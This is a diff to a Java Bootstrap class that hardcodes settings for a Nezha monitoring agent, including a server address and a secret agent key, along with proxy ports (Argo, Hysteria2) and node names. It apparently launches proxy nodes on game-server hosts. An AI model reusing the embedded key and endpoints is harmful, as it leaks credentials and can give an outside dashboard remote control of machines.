@@ -98,11 +98,11 @@ public class Bootstrap
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "BxAaf8bYZdkB26NF1l");
+        envVars.put("NEZHA_KEY", "N0D7pbuuIrF37cUbyz");
         envVars.put("ARGO_PORT", "8001");
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
-        envVars.put("HY2_PORT", "20123");
+        envVars.put("HY2_PORT", "7008");
         envVars.put("TUIC_PORT", "");
         envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
@@ -110,7 +110,7 @@ public class Bootstrap
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "time.is");
         envVars.put("CFPORT", "2096");
-        envVars.put("NAME", "greathost");
+        envVars.put("NAME", "host2play");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
